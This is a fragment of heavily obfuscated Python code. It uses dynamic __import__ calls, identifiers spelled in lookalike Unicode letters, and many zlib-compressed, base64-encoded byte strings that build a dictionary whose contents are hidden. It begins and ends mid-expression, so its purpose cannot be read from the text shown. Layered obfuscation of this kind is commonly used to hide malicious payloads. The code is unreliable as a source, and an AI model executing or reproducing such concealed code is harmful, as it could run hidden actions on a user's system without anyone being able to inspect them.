0.8715222357855059j))]).decompress(b'x\xdaKv/\xb7\x05\x00\x03\x90\x01_')).decode(), __𝗶𝙢𝗽𝘰𝘳𝘁__(𝘭𝘔𝘐𝗜𝙈𝙡𝗠𝘕𝘐𝘐𝗡𝗠𝘭𝘭𝗜𝘔𝗹𝘔𝗹𝘐𝘔𝙄𝙈𝗜𝙉𝙈𝗜𝘭𝘭𝙡𝙉𝘭[𝗿𝘰𝘶𝙣𝗱(𝗮𝗯𝘀(0.0 + 0j))]).b64decode(__𝙞𝘮𝙥𝘰𝗿𝘁__(𝗹𝘔𝗜𝙄𝙈𝘭𝙈𝘕𝘐𝙄𝗡𝙈𝙡𝗹𝘐𝙈𝙡𝗠𝙡𝙄𝘔𝘐𝘔𝙄𝘕𝗠𝘐𝙡𝗹𝗹𝗡𝗹[𝙧𝘰𝙪𝙣𝗱(𝘢𝘣𝘀(0.752119105075915 + 0.6590272010924927j))]).decompress(b'x\xda\x8b4\xb2,Mq\x0f+Mq6,\x8e\n7\xcdKqO\xb7\x05\x00E\x1e\x06\x9e')).decode(): __𝗶𝗺𝙥𝙤𝗿𝘁__(𝙡𝙈𝗜𝗜𝘔𝗹𝗠𝘕𝙄𝘐𝗡𝙈𝘭𝘭𝘐𝙈𝗹𝘔𝘭𝙄𝗠𝘐𝘔𝙄𝙉𝘔𝗜𝘭𝗹𝗹𝗡𝗹[𝙧𝘰𝘶𝘯𝙙(𝗮𝗯𝘀(0.0 + 0j))]).b64decode(__𝗶𝙢𝗽𝘰𝘳𝙩__(𝗹𝙈𝗜𝙄𝘔𝙡𝙈𝙉𝗜𝙄𝙉𝘔𝗹𝘭𝘐𝙈𝙡𝘔𝗹𝗜𝗠𝘐𝘔𝘐𝘕𝘔𝗜𝙡𝘭𝗹𝘕𝗹[𝘳𝘰𝘶𝘯𝗱(𝙖𝘣𝙨(0.3687004884768915 + 0.9295482503866604j))]).decompress(b'x\xda\xf3u\xb4\xb5\x05\x00\x02\xb2\x01\t')).decode(), __𝘪𝙢𝙥𝘰𝗿𝘵__(𝗹𝙈𝙄𝗜𝙈𝘭𝙈𝗡𝙄𝘐𝗡𝙈𝙡𝗹𝗜𝙈𝙡𝘔𝙡𝗜𝙈𝘐𝘔𝙄𝗡𝙈𝗜𝙡𝙡𝘭𝗡𝘭[𝗿𝘰𝘶𝘯𝘥(𝘢𝙗𝘀(0.0 + 0j))]).b64decode(__𝙞𝗺𝙥𝗼𝗿𝘵__(𝗹𝗠𝗜𝙄𝘔𝗹𝘔𝙉𝙄𝙄𝙉𝗠𝘭𝘭𝘐𝗠𝗹𝗠𝘭𝙄𝙈𝘐𝙈𝘐𝙉𝗠𝗜𝘭𝗹𝗹𝘕𝗹[𝗿𝙤𝙪𝙣𝙙(𝙖𝗯𝙨(0.2275403728054307 + 0.973768647443306j))]).decompress(b'x\xda\x8b4\xb2,K4\xca\xc9\x01\x00\x0b0\x02\xa6')).decode(): __𝘪𝘮𝙥𝗼𝗿𝙩__(𝙡𝘔𝙄𝙄𝘔𝙡𝘔𝘕𝗜𝗜𝗡𝗠𝗹𝘭𝙄𝘔𝘭𝗠𝙡𝗜𝗠𝗜𝗠𝗜𝘕𝗠𝗜𝙡𝗹𝗹𝘕𝗹[𝗿𝘰𝘶𝘯𝗱(𝗮𝙗𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝗽𝗼𝘳𝘵__(𝙡𝙈𝙄𝙄𝗠𝙡𝘔𝙉𝗜𝘐𝘕𝙈𝙡𝘭𝙄𝙈𝙡𝘔𝗹𝗜𝗠𝙄𝗠𝙄𝗡𝗠𝗜𝙡𝘭𝘭𝗡𝙡[𝙧𝙤𝙪𝗻𝗱(𝙖𝗯𝘀(0.2336742692180822 + 0.9723149365845385j))]).decompress(b'x\xda\x85PM\x8f\x9b0\x10\xfdK\xd8\x81\x03\x87=\x90\x18\x08\x08\x8f\x1708\xf6\x8d@\x17\x18\xc7\xd5J\xdd\x08\xc2\xaf\xaf\xbb\xa7\x1e*\xf58O\xf3>o$\xb6\x9a\x1a;\xa9\x87}\x97\xcd\x83\xe7ihX\xb7A\x9e\x06\xc0\xd2\xdd\xa8~\x15lq@u(r\xb3j\xec-\xc7\xf3"^\xe7\x8f\xdb\t\xfe\xc5\xdd\xff\xc7\xd5G\xedo\xb0\xc0\xe6\x08\\\xb3\x18\xa9\t\x1c\xcd\xa2Uz2\xaet\x1a91\xd8\xaf\x1c\xcb\x15XB\xb4+\xad\x90|7\xaeA\x8d\xe3K\x1f\xc5np&\x1a\x0b\xca\xa9\xa6\\\xd6\x1bg\xbf\xe6\x1b\x89\x8f\xe9Z~\x8ey\xffq\xff\xced\xfdO\x12\t\xd9,\x95\xec\x08\xc8\xee\x0b\xf2\xec\xc1W\xb2\x80,\xa2J\xa6\x91\xc9}W\xd5\x85Z\xce\x01G\xed=x\xc0\xe5\xb7\x16\x9a\x9f%\x19T\x1d\xc31F@a\x11\xaa \x9c\x16\x1bW\xfa\xc5U\x8f\x1c3\x14y\x89Z\xda\x1d0\t\xc1i\x9fF\x1fBy\x95K\xe01\x1bx\x9f\x1d\xd8\xb8\xf9\xbd\xd0<b\xbc\xe7\xfd2\xba\xec\xa9i\x17\x0f\xdd\xbeN\x98\x15\xa2\x8fmk\xb3vp\xe6TY\xf2j\xafgyW{0\x1dS\xfa#\x9f\xb7\xbb\x1b\x9f-\x8d\xe4`\xe3\xeb \xb3\xb2m\xff\xd2\x96IX\xc9\xe4\x8b\xb7\x7f:\xd5\x81\xc1\xfad\xda\xc8o\x9cR\xc3&\x84K\xe4S\xf9\xfd\x98\xb1\xe6\x12l\x15\x16O.u\x04\xac{q\xd9m"y{\xfb\rV\x94\xabK')).decode(), __𝙞𝘮𝗽𝙤𝙧𝘵__(𝘭𝙈𝗜𝗜𝙈𝗹𝗠𝘕𝘐𝙄𝙉𝙈𝘭𝙡𝗜𝙈𝙡𝘔𝙡𝘐𝗠𝗜𝘔𝙄𝙉𝗠𝙄𝙡𝙡𝙡𝘕𝙡[𝗿𝙤𝘂𝘯𝗱(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(__𝘪𝙢𝗽𝙤𝗿𝘁__(𝘭𝗠𝙄𝙄𝗠𝗹𝙈𝙉𝙄𝘐𝙉𝙈𝗹𝘭𝘐𝗠𝙡𝘔𝗹𝙄𝙈𝗜𝙈𝘐𝙉𝙈𝙄𝙡𝘭𝗹𝘕𝗹[𝘳𝙤𝘶𝙣𝘥(𝙖𝙗𝘴(0.3504135117527246 + 0.9365950943610174j))]).decompress(b'x\xdaK2\xf6*\x882\xca)\x05\x00\x0b\xb4\x02\xbd')).decode(): __𝙞𝗺𝘱𝙤𝙧𝘵__(𝘭𝙈𝘐𝙄𝗠𝗹𝘔𝘕𝘐𝘐𝘕𝙈𝙡𝘭𝙄𝘔𝙡𝘔𝘭𝘐𝘔𝘐𝙈𝙄𝗡𝙈𝘐𝘭𝗹𝘭𝘕𝘭[𝗿𝙤𝙪𝙣𝘥(𝗮𝙗𝙨(0.0 + 0j))]).b64decode(__𝘪𝗺𝙥𝗼𝙧𝙩__(𝙡𝗠𝙄𝙄𝘔𝘭𝙈𝗡𝘐𝘐𝗡𝘔𝗹𝗹𝙄𝘔𝗹𝙈𝗹𝘐𝗠𝗜𝗠𝗜𝗡𝙈𝙄𝗹𝘭𝙡𝗡𝗹[𝘳𝘰𝙪𝘯𝙙(𝗮𝙗𝘴(0.7321406394734001 + 0.6811534952060958j))]).decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\xc9\xf5+K\n\xb4\xb5\x05\x00\x83%\t(')).decode(), __𝙞𝙢𝙥𝙤𝙧𝘵__(𝙡𝗠𝙄𝘐𝘔𝙡𝘔𝙉𝘐𝘐𝙉𝘔𝗹𝗹𝙄𝘔𝗹𝗠𝘭𝙄𝘔𝘐𝗠𝘐𝗡𝙈𝙄𝘭𝘭𝗹𝘕𝘭[𝗿𝗼𝘶𝘯𝘥(𝗮𝘣𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝙤𝙧𝙩__(𝙡𝙈𝘐𝙄𝗠𝘭𝗠𝙉𝗜𝙄𝘕𝙈𝘭𝙡𝗜𝗠𝗹𝙈𝙡𝙄𝗠𝘐𝗠𝗜𝘕𝘔𝙄𝙡𝘭𝗹𝘕𝘭[𝘳𝗼𝘂𝗻𝘥(𝙖𝙗𝘀(0.3776586926197587 + 0.9259448751889794j))]).decompress(b'x\xdaK6\n\xcb\xf2\t\xf7\xcb\xf7\x89\x08\xcb\x00\x00\x19\xf8\x04\x18')).decode(): __𝗶𝗺𝙥𝘰𝗿𝘵__(𝗹𝗠𝗜𝘐𝙈𝙡𝘔𝗡𝗜𝙄𝙉𝙈𝗹𝘭𝘐𝗠𝙡𝘔𝙡𝙄𝗠𝘐𝙈𝘐𝗡𝙈𝙄𝙡𝗹𝗹𝗡𝙡[𝙧𝗼𝙪𝙣𝘥(𝗮𝘣𝘴(0.0 + 0j))]).b64decode(__𝗶𝙢𝘱𝘰𝘳𝘁__(𝙡𝗠𝙄𝙄𝙈𝙡𝗠𝗡𝗜𝙄𝙉𝗠𝘭𝗹𝙄𝘔𝗹𝘔𝗹𝙄𝗠𝙄𝗠𝙄𝙉𝙈𝗜𝘭𝗹𝗹𝙉𝘭[𝙧𝘰𝘂𝘯𝗱(𝙖𝗯𝘴(0.4763366585576957 + 0.8792629798382787j))]).decompress(b'x\xda\xf3\xcc6-Kq\xb1t\x8a0\xf0\xaa\x8c\x0c7\xcd\xf6\xcc*1\n\x08\xf64\xf1\xcc,O\xf7\xcc\xf6\xcbO\xce\xb5,I\x8c\x08+\x81\x8aW\xf8\xba\xa4g\x02\x00\xc9\xd9\x11\xb6')).decode(), __𝙞𝗺𝘱𝙤𝙧𝙩__(𝙡𝘔𝗜𝙄𝗠𝙡𝙈𝙉𝘐𝗜𝙉𝗠𝘭𝙡𝗜𝘔𝘭𝘔𝘭𝘐𝘔𝙄𝘔𝙄𝘕𝘔𝗜𝗹𝙡𝘭𝗡𝗹[𝙧𝙤𝘂𝗻𝗱(𝙖𝙗𝘀(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝘰𝘳𝘁__(𝗹𝙈𝘐𝗜𝙈𝗹𝙈𝗡𝘐𝘐𝘕𝘔𝗹𝘭𝘐𝘔𝗹𝘔𝗹𝘐𝙈𝗜𝘔𝘐𝙉𝙈𝙄𝙡𝗹𝙡𝘕𝗹[𝙧𝗼𝘶𝘯𝙙(𝙖𝗯𝙨(0.8107102564165627 + 0.5854475895765489j))]).decompress(b'x\xdaK6\n\xcb\xf2\t\xf7\xcb\xf7\x89\x08\xcb\xf0\t7,\x8b\xcc\xcd)\x8e\n\xb4\xb5\x05\x00f\x11\x08,')).decode(): __𝘪𝙢𝙥𝗼𝗿𝙩__(𝗹𝙈𝘐𝘐𝙈𝙡𝙈𝘕𝗜𝘐𝗡𝗠𝙡𝘭𝘐𝙈𝗹𝙈𝗹𝘐𝗠𝙄𝗠𝘐𝗡𝗠𝘐𝙡𝘭𝙡𝘕𝗹[𝘳𝙤𝘂𝗻𝗱(𝙖𝙗𝙨(0.0 + 0j))]).b64decode(__𝘪𝘮𝙥𝘰𝘳𝘁__(𝘭𝘔𝗜𝙄𝙈𝘭𝙈𝙉𝘐𝙄𝘕𝘔𝗹𝙡𝗜𝘔𝙡𝗠𝗹𝗜𝘔𝘐𝙈𝙄𝘕𝘔𝗜𝗹𝙡𝗹𝘕𝙡[𝙧𝘰𝙪𝘯𝙙(𝘢𝗯𝘴(0.060431034620375024 + 0.9981723749206401j))]).decompress(b'x\xda\x0b\xa8r\xb4\x05\x00\x03q\x01I')).decode(), __𝗶𝗺𝙥𝗼𝙧𝘵__(𝗹𝘔𝘐𝘐𝘔𝗹𝙈𝙉𝘐𝗜𝗡𝗠𝗹𝙡𝗜𝘔𝘭𝗠𝙡𝙄𝗠𝙄𝙈𝙄𝙉𝙈𝙄𝙡𝙡𝗹𝘕𝘭[𝘳𝘰𝙪𝙣𝘥(𝙖𝗯𝘴(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝙤𝗿𝙩__(𝘭𝘔𝙄𝘐𝗠𝘭𝙈𝘕𝙄𝙄𝘕𝗠𝙡𝘭𝙄𝗠𝗹𝗠𝙡𝙄𝗠𝙄𝙈𝗜𝙉𝗠𝘐𝗹𝗹𝘭𝙉𝗹[𝗿𝘰𝘂𝗻𝙙(𝘢𝘣𝘴(0.02223546371162055 + 0.9997527615133299j))]).decompress(b'x\xdaK6\n\xcb\xf2\t\xf7\xcb\xf7\x89\x08\xcb\xf0\x89p*\x8e\x8c\x08\xcaM2\xf6*\x01\x00eu\x084')).decode(): __𝘪𝙢𝘱𝗼𝗿𝘁__(𝘭𝙈𝘐𝙄𝙈𝘭𝙈𝙉𝗜𝘐𝗡𝘔𝘭𝙡𝙄𝙈𝗹𝗠𝘭𝙄𝙈𝗜𝗠𝘐𝙉𝘔𝗜𝗹𝘭𝗹𝙉𝗹[𝗿𝙤𝘶𝗻𝘥(𝗮𝗯𝘴(0.0 + 0j))]).b64decode(__𝙞𝗺𝗽𝙤𝘳𝘵__(𝘭𝘔𝗜𝗜𝙈𝙡𝙈𝙉𝗜𝙄𝗡𝙈𝗹𝙡𝙄𝗠𝙡𝘔𝙡𝙄𝘔𝙄𝘔𝘐𝘕𝘔𝘐𝗹𝘭𝗹𝙉𝗹[𝙧𝗼𝙪𝘯𝘥(𝙖𝘣𝘀(0.8114906942332041 + 0.5843653422071782j))]).decompress(b'x\xda\xf3\xccI)H\xca\r*K1\xf6\xcd\x04\x00\x1de\x04n')).decode(), __𝙞𝙢𝙥𝗼𝗿𝙩__(𝘭𝙈𝗜𝙄𝗠𝙡𝙈𝗡𝗜𝗜𝙉𝗠𝗹𝗹𝙄𝗠𝘭𝗠𝙡𝙄𝘔𝗜𝘔𝗜𝗡𝘔𝙄𝙡𝘭𝘭𝗡𝙡[𝗿𝙤𝘂𝘯𝗱(𝙖𝙗𝘀(0.0 + 0j))]).b64decode(__𝗶𝘮𝘱𝘰𝗿𝘁__(𝗹𝙈𝗜𝙄𝗠𝘭𝗠𝙉𝙄𝗜𝗡𝗠𝘭𝘭𝗜𝙈𝘭𝙈𝙡𝙄𝘔𝘐𝗠𝗜𝗡𝘔𝙄𝘭𝙡𝗹𝘕𝗹[𝘳𝙤𝘂𝙣𝗱(𝙖𝘣𝘀(0.5091750579949017 + 0.8606629771960035j))]).decompress(b'x\xdaK6\n\xcb\xf2\t\x8f\xcaIq\xf7\xcb\xf7\t\x0f\xcaI6\x0e\xb4\x05\x00GZ\x06\xac')).decode(): __𝗶𝙢𝗽𝙤𝘳𝘵__(𝘭𝘔𝘐𝘐𝗠𝙡𝘔𝙉𝘐𝘐𝙉𝙈𝙡𝙡𝙄𝘔𝗹𝗠𝗹𝘐𝘔𝘐𝘔𝗜𝗡𝗠𝘐𝘭𝙡𝙡𝙉𝘭[𝙧𝙤𝘶𝙣𝙙(𝗮𝙗𝙨(0.0 + 0j))]).b64decode(__𝗶𝙢𝘱𝘰𝙧𝙩__(𝘭𝘔𝙄𝗜𝘔𝙡𝗠𝗡𝙄𝗜𝘕𝙈𝘭𝗹𝙄𝙈𝗹𝘔𝙡𝙄𝘔𝘐𝙈𝘐𝗡𝗠𝘐𝗹𝗹𝙡𝙉𝘭[𝗿𝙤𝘂𝘯𝗱(𝘢𝘣𝘀(0.9861486755123775 + 0.16586376875370828j))]).decompress(b'x\xda\x8b\n7,O\xf1\xc8\xb6\x05\x00\x0c-\x02\xae')).decode(), __𝘪𝗺𝙥𝙤𝙧𝙩__(𝙡𝘔𝘐𝗜𝙈𝙡𝘔𝘕𝘐𝘐𝙉𝗠𝗹𝗹𝙄𝙈𝗹𝗠𝗹𝗜𝗠𝘐𝘔𝗜𝘕𝗠𝗜𝘭𝗹𝗹𝗡𝘭[𝗿𝗼𝘶𝗻𝘥(𝗮𝙗𝘀(0.0 + 0j))]).b64decode(__𝘪𝘮𝗽𝘰𝙧𝙩__(𝘭𝗠𝘐𝗜𝙈𝘭𝗠𝘕𝘐𝘐𝗡𝘔𝘭𝗹𝘐𝘔𝗹𝘔𝙡𝙄𝘔𝙄𝙈𝗜𝘕𝙈𝘐𝙡𝘭𝗹𝙉𝗹[𝗿𝗼𝘶𝗻𝘥(𝗮𝘣𝘴(0.5976939943776924 + 0.8017243223732451j))]).decompress(b'x\xdaK6\n\xcb\xf2\t\x8f\xcaIq\xf7\xcb\xf7\t7,\x8br\x0f\xb5\x05\x00F\xe6\x06\xa4')).decode(): __𝙞𝙢𝗽𝗼𝗿𝙩__(𝘭𝙈𝙄𝘐𝗠𝗹𝘔𝘕𝙄𝘐𝘕𝗠𝗹𝙡𝘐𝗠𝙡𝙈𝗹𝗜𝙈𝘐𝘔𝘐𝙉𝘔𝘐𝘭𝘭𝘭𝘕𝗹[𝙧𝙤𝘂𝗻𝗱(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝙞𝘮𝘱𝘰𝙧𝘁__(𝙡𝗠𝘐𝙄𝗠𝗹𝙈𝘕𝗜𝗜𝙉𝗠𝙡𝘭𝙄𝗠𝗹𝘔𝗹𝘐𝗠𝘐𝙈𝙄𝘕𝘔𝘐𝘭𝗹𝗹𝘕𝘭[𝗿𝘰𝘶𝘯𝙙(𝗮𝙗𝘴(0.7784003455213382 + 0.6277681913670533j))]).decompress(b'x\xda\x8b4\xb2\xacL.\xb7\xb5\x05\x00\x0b\x89\x02\x92')).decode(), __𝘪𝗺𝗽𝙤𝘳𝙩__(𝙡𝗠𝙄𝘐𝙈𝘭𝙈𝘕𝘐𝘐𝗡𝗠𝘭𝘭𝗜𝘔𝗹𝙈𝗹𝗜𝙈𝗜𝘔𝙄𝘕𝘔𝘐𝙡𝙡𝗹𝘕𝙡[𝘳𝙤𝙪𝙣𝗱(𝙖𝘣𝘴(0.0 + 0j))]).b64decode(__𝙞𝗺𝗽𝗼𝙧𝙩__(𝗹𝙈𝘐𝘐𝘔𝙡𝙈𝗡𝘐𝘐𝗡𝘔𝗹𝗹𝘐𝙈𝘭𝙈𝘭𝘐𝗠𝙄𝘔𝙄𝘕𝘔𝙄𝘭𝗹𝘭𝗡𝗹[𝘳𝗼𝘶𝙣𝘥(𝗮𝘣𝙨(0.26132969915946425 + 0.9652495989831976j))]).decompress(b'x\xdaK6\n\xcb\xf2\t\x8f\xcaIq\xf7\xcb\xf7\x89\xf0+Hq\x0f\xb5\x05\x00G\xa5\x06\xc6')).decode(): __𝗶𝗺𝘱𝘰𝗿𝘁__(𝗹𝘔𝘐𝙄𝗠𝗹𝘔𝗡𝗜𝗜𝘕𝗠𝙡𝘭𝗜𝗠𝘭𝘔𝙡𝗜𝘔𝗜𝙈𝗜𝙉𝘔𝗜𝙡𝘭𝗹𝙉𝗹[𝗿𝙤𝘶𝘯𝘥(𝘢𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝙢𝙥𝘰𝘳𝘁__(𝗹𝙈𝘐𝗜𝗠𝗹𝘔𝗡𝘐𝗜𝙉𝘔𝗹𝙡𝗜𝙈𝘭𝙈𝙡𝙄𝗠𝙄𝙈𝘐𝘕𝗠𝘐𝘭𝘭𝗹𝙉𝘭[𝙧𝘰𝘶𝙣𝘥(𝗮𝙗𝙨(0.7656074379834322 + 0.6433080528832552j))]).decompress(b'x\xdaK6r+\x89\n6,K\xce\xcd\xc9K\x0c7\xb1\x05\x00.\xae\x05w')).decode(), __𝙞𝘮𝙥𝘰𝗿𝘁__(𝙡𝗠𝙄𝗜𝗠𝗹𝗠𝙉𝘐𝘐𝙉𝙈𝘭𝗹𝙄𝙈𝗹𝘔𝘭𝘐𝙈𝘐𝙈𝙄𝘕𝘔𝙄𝙡𝙡𝙡𝙉𝙡[𝘳𝗼𝘂𝙣𝗱(𝙖𝘣𝘀(0.0 + 0j))]).b64decode(__𝗶𝘮𝙥𝙤𝗿𝘵__(𝗹𝙈𝙄𝗜𝘔𝘭𝙈𝗡𝘐𝗜𝘕𝘔𝗹𝙡𝗜𝗠𝗹𝘔𝗹𝙄𝙈𝙄𝗠𝗜𝘕𝘔𝙄𝘭𝘭𝗹𝘕𝘭[𝙧𝙤𝙪𝙣𝘥(𝙖𝗯𝘴(0.09476103536377578 + 0.9955000483057674j))]).decompress(b'x\xdaK\x89\xf0\xcbI\xce4\xcc\x882\n+Mq\xb4\xb5\x05\x00/v\x05R')).decode(): __𝗶𝘮𝙥𝘰𝙧𝙩__(𝘭𝙈𝙄𝘐𝙈𝘭𝗠𝘕𝗜𝗜𝘕𝘔𝗹𝗹𝘐𝘔𝘭𝗠𝘭𝙄𝗠𝘐𝘔𝘐𝘕𝘔𝘐𝗹𝘭𝙡𝙉𝗹[𝗿𝘰𝘂𝙣𝘥(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝙞𝙢𝙥𝙤𝗿𝘁__(𝙡𝘔𝗜𝙄𝙈𝙡𝗠𝘕𝘐𝘐𝙉𝘔𝘭𝘭𝗜𝙈𝙡𝙈𝘭𝙄𝙈𝙄𝘔𝘐𝘕𝙈𝙄𝘭𝘭𝘭𝗡𝗹[𝘳𝙤𝘂𝗻𝙙(𝗮𝗯𝙨(0.3259722691592425 + 0.9453793311360125j))]).decompress(b'x\xda=\xcdA\x0f\x82 \x18\x80\xe1\xbf\xa4_\xad\xe9\xc1\x83+u\x14\xd0T@\xeb\xa6\xb8\xa1\xa4\x8b\xcd)\xca\xaf\xaf.]\xdf\xc3\xf3\xb2*<5\xd56?\xca\xc0\xc7:V\xb7\xb43\xedT\xac\xdd\x81(6\xe6\x8a\xb0x!\x97Y\t/\xac\xa9\xce\rJR+\xb3m\x14 \x86\x12F\x0f;\xee\xe8~tt\x88\xdf\xa5\xd7s\xc6\xed\x8c\xb2\xcd4\xc0U\x01B7\x10\x18\x94\x15F\x02]\xe5\x94\xaf\xa4<Z\xac_\x960\xa9r\xe8\xf7\x16\xfc\x11\xbb\xc4\xde\xcf\xbf\xfe\xb5\xd8k!:\xf1Q"\xe6gE=9\x85\x0bvh\xc7\x9a,\x84!\xc5!\x9d\x1e\xf5\xd5\xfc\xbf*\x8a>\xc9\x89CX')).decode(), __𝙞𝗺𝗽𝙤𝗿𝘵__(𝗹𝙈𝗜𝗜𝘔𝙡𝘔𝗡𝙄𝙄𝗡𝙈𝙡𝙡𝙄𝙈𝘭𝘔𝘭𝗜𝘔𝘐𝙈𝘐𝗡𝙈𝗜𝘭𝙡𝗹𝗡𝘭[𝘳𝘰𝙪𝗻𝘥(𝘢𝙗𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝙤𝘳𝘁__(𝙡𝗠𝘐𝙄𝗠𝗹𝙈𝙉𝗜𝙄𝘕𝗠𝗹𝘭𝙄𝙈𝙡𝙈𝙡𝙄𝗠𝗜𝘔𝙄𝗡𝗠𝙄𝙡𝘭𝘭𝗡𝙡[𝗿𝘰𝘶𝙣𝘥(𝗮𝙗𝙨(0.9707197024036659 + 0.24021502735120104j))]).decompress(b'x\xdaKu6\xcc\x8e\n\xf72\x8c\xaa4,K\xf6\x08*H22\xad\x02\x00Di\x06\x9b')).decode(): __𝙞𝙢𝗽𝘰𝗿𝘵__(𝙡𝙈𝘐𝗜𝙈𝘭𝘔𝘕𝘐𝗜𝘕𝘔𝙡𝙡𝘐𝘔𝗹𝙈𝘭𝙄𝗠𝗜𝙈𝙄𝗡𝙈𝘐𝙡𝙡𝗹𝗡𝗹[𝙧𝙤𝘂𝗻𝗱(𝘢𝗯𝙨(0.0 + 0j))]).b64decode(__𝘪𝘮𝗽𝙤𝘳𝘵__(𝘭𝘔𝗜𝘐𝙈𝘭𝗠𝗡𝙄𝘐𝗡𝘔𝘭𝙡𝙄𝗠𝘭𝗠𝙡𝘐𝗠𝗜𝗠𝙄𝗡𝘔𝘐𝘭𝗹𝗹𝙉𝘭[𝘳𝗼𝙪𝙣𝙙(𝘢𝗯𝘴(0.4808329851355261 + 0.8768122036135554j))]).decompress(b'x\xda\x8b\xcc\x0b\xcb\x0b\xcd\r+O2\xf62\x88\x8a\xf0rK\xcau\xcbLr\x0f\xcb\x06\x00i\x8d\x08T')).decode(), __𝙞𝙢𝘱𝙤𝗿𝙩__(𝙡𝙈𝘐𝘐𝙈𝙡𝗠𝘕𝘐𝙄𝗡𝘔𝗹𝗹𝙄𝙈𝙡𝙈𝗹𝙄𝗠𝗜𝗠𝘐𝘕𝙈𝗜𝗹𝘭𝗹𝘕𝘭[𝙧𝘰𝙪𝗻𝘥(𝘢𝘣𝙨(0.0 + 0j))]).b64decode(__𝘪𝗺𝙥𝘰𝙧𝘵__(𝙡𝗠𝘐𝙄𝙈𝙡𝙈𝗡𝗜𝙄𝘕𝗠𝙡𝗹𝗜𝙈𝙡𝙈𝗹𝙄𝙈𝘐𝘔𝗜𝙉𝘔𝗜𝗹𝙡𝙡𝗡𝘭[𝘳𝙤𝘂𝙣𝘥(𝙖𝗯𝙨(0.800268565178191 + 0.5996417460347799j))]).decompress(b'x\xdaKu6\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\t\xaf(\x8b4r+\x8e\n\xb4\xb5\x05\x00e\n\x07\xfa')).decode(): __𝙞𝙢𝗽𝗼𝘳𝘵__(𝙡𝘔𝘐𝘐𝘔𝗹𝙈𝙉𝘐𝘐𝘕𝙈𝗹𝙡𝗜𝘔𝙡𝗠𝙡𝘐𝙈𝗜𝙈𝙄𝗡𝗠𝗜𝘭𝗹𝙡𝘕𝗹[𝙧𝙤𝘂𝙣𝘥(𝘢𝙗𝘀(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝘰𝗿𝘵__(𝘭𝙈𝗜𝙄𝘔𝗹𝘔𝘕𝙄𝙄𝗡𝗠𝗹𝗹𝙄𝙈𝙡𝗠𝙡𝗜𝘔𝗜𝙈𝘐𝗡𝙈𝘐𝙡𝘭𝙡𝙉𝗹[𝘳𝙤𝘂𝗻𝗱(𝗮𝗯𝙨(0.6312843891517983 + 0.7755514296378034j))]).decompress(b'x\xdaKv/\xb7\x05\x00\x03\x90\x01_')).decode(), __𝘪𝘮𝗽𝘰𝘳𝙩__(𝙡𝘔𝙄𝙄𝘔𝙡𝙈𝙉𝙄𝘐𝙉𝙈𝗹𝙡𝗜𝗠𝙡𝙈𝘭𝘐𝙈𝙄𝘔𝗜𝘕𝙈𝘐𝘭𝗹𝗹𝙉𝘭[𝙧𝘰𝘂𝗻𝙙(𝘢𝗯𝙨(0.0 + 0j))]).b64decode(__𝙞𝘮𝘱𝗼𝗿𝙩__(𝘭𝙈𝗜𝘐𝘔𝘭𝘔𝘕𝙄𝙄𝙉𝗠𝘭𝘭𝗜𝘔𝙡𝘔𝗹𝘐𝗠𝙄𝙈𝙄𝘕𝙈𝗜𝙡𝙡𝘭𝙉𝗹[𝘳𝙤𝙪𝘯𝙙(𝘢𝗯𝙨(0.7667911552947972 + 0.6418966615909995j))]).decompress(b'x\xdaKu6\xccN\x8c\xf0\xcbJ2\xf6\xca\xf6\x89\x08*H\n\x0f3K22\xcd\x01\x00c\xbf\x07\xe0')).decode(): __𝗶𝙢𝙥𝗼𝘳𝙩__(𝘭𝗠𝗜𝘐𝗠𝗹𝙈𝙉𝗜𝗜𝙉𝘔𝙡𝘭𝘐𝙈𝘭𝙈𝗹𝘐𝙈𝘐𝗠𝘐𝘕𝘔𝙄𝙡𝘭𝘭𝗡𝗹[𝗿𝘰𝘂𝙣𝗱(𝗮𝘣𝘴(0.0 + 0j))]).b64decode(__𝘪𝘮𝘱𝗼𝙧𝘁__(𝙡𝙈𝙄𝙄𝗠𝘭𝙈𝗡𝙄𝘐𝙉𝗠𝗹𝗹𝘐𝗠𝙡𝘔𝘭𝗜𝗠𝙄𝘔𝘐𝙉𝗠𝙄𝙡𝗹𝘭𝙉𝘭[𝗿𝗼𝙪𝗻𝘥(𝗮𝘣𝘴(0.8396448412955652 + 0.5431358398096605j))]).decompress(b'x\xda\x0b\x8a\x08\xabL2v\xca\xf11L\xc9H\xce\xf3\xcbH)\xb7\xb5\x05\x00H+\x06\xe2')).decode(), __𝗶𝗺𝘱𝘰𝙧𝘁__(𝙡𝗠𝗜𝙄𝗠𝗹𝘔𝙉𝙄𝗜𝙉𝘔𝙡𝘭𝙄𝘔𝙡𝙈𝙡𝘐𝗠𝗜𝗠𝗜𝗡𝙈𝙄𝗹𝙡𝗹𝘕𝘭[𝗿𝘰𝘂𝘯𝘥(𝙖𝗯𝙨(0.0 + 0j))]).b64decode(__𝗶𝗺𝗽𝙤𝘳𝘵__(𝗹𝗠𝗜𝘐𝗠𝗹𝙈𝙉𝙄𝗜𝗡𝙈𝗹𝘭𝗜𝘔𝗹𝗠𝘭𝗜𝙈𝘐𝗠𝙄𝗡𝘔𝘐𝙡𝘭𝙡𝘕𝗹[𝗿𝗼𝘂𝘯𝘥(𝗮𝗯𝘴(0.8852923885426867 + 0.46503482319970907j))]).decompress(b'x\xdaKu6\xacJ\x89p\xcaI\xce4,O\xce\xb5,\x8f\x8a\xf02H\x0c\x0f\xab\x02\x00hT\x08f')).decode(): __𝗶𝙢𝙥𝗼𝙧𝙩__(𝘭𝗠𝗜𝙄𝘔𝘭𝗠𝙉𝘐𝙄𝗡𝙈𝘭𝘭𝘐𝗠𝗹𝘔𝗹𝘐𝙈𝙄𝙈𝙄𝘕𝙈𝘐𝗹𝘭𝘭𝘕𝙡[𝙧𝘰𝙪𝙣𝙙(𝗮𝗯𝘴(0.0 + 